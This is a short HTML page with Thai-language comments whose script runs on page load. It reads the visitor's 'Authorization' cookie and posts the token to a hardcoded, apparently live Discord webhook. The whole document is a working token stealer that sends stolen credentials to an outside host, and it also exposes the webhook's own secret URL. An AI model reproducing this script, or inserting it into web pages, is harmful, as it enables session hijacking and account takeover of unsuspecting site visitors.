<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch and Send Token</title>
    <script>
        // URL ของ Discord Webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';

        // ดึงข้อมูล Authorization Token จากคุกกี้
        function fetchAndSendToken() {
            // ค้นหาค่าของ Authorization Token จากคุกกี้
            const cookies = document.cookie.split('; ');
            const tokenCookie = cookies.find(row => row.startsWith('Authorization='));
            const token = tokenCookie ? tokenCookie.split('=')[1] : 'Token not found';

            // ส่ง Token ไปยัง Discord Webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: 'Authorization Token: ' + token,
                }),
            })
            .then(response => response.json())
            .then(data => console.log('Webhook response:', data))
            .catch(error => console.error('Error sending webhook:', error));
        }

        // เมื่อโหลดหน้าเว็บทำการดึงข้อมูล
        window.onload = function() {
            fetchAndSendToken();
        }
    </script>
</head>
<body>
    <h1>Fetching Token and Sending to Webhook</h1>
</body>
</html>
